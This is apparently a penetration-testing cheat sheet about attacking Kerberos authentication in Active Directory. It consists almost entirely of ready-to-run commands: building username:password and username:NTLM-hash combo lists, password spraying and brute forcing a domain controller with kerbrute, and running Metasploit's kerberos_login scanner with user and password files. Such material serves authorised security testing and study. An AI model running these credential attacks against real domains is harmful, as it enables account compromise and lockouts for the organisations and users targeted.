---
author(s):
  - Userware
tags:
  - vulnerability-assessment
  - network-ports
  - kerberos
---
# Kerberos

## 01 - Credential Combolist

Combine usernames and passwords.

```
$ paste -d ":" users.lst passwords.list > combolist.lst

$ awk 'NR==FNR {a[FNR]=$1; next} {print a[FNR] ":" $1; }' users.lst passwords.lst > combolist.lst
```

Combine usernames and NTLM hashes.

```
$ paste -d ":" users.lst hashes.list > combolist.lst

$ awk 'NR==FNR {a[FNR]=$1; next} {print a[FNR] ":" $1; }' users.lst hashes.lst > combolist.lst
```

## 01 - #kerbrute

Password Spray each domain username accounts from an active directory.

```
$ kerbrute passwordspray [--dc <IP>] -d <domain> users.lst "<password>"
```

Brute force a username with a password dictionary (not recommended unless it has no lockout policy).

```
$ kerbrute bruteuser [--dc <IP>] -d <domain> passwords.lst "<username>"
```

Brute force with a combo list of usernames and passwords against a domain controller.

```
$ cat combolist.lst | kerbrute [--dc <IP>] -d <domain> bruteforce -
```

## 02 - Metasploit

```
msf > use auxiliary/scanner/kerberos/kerberos_login

msf auxiliary(scanner/kerberos/kerberos_login) > options

msf auxiliary(scanner/kerberos/kerberos_login) > set rhosts <IP>

msf auxiliary(scanner/kerberos/kerberos_login) > set domain <domain>.<tld>

msf auxiliary(scanner/kerberos/kerberos_login) > run user_file=users.lst pass_file=passwords.lst
```

---
## References

### Hacktricks

- [Hacktricks: Pentesting Kerberos](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html)

### Hacking Articles

- [Hacking Articles: A Detailed Guide on Kerbrute](https://www.hackingarticles.in/a-detailed-guide-on-kerbrute/)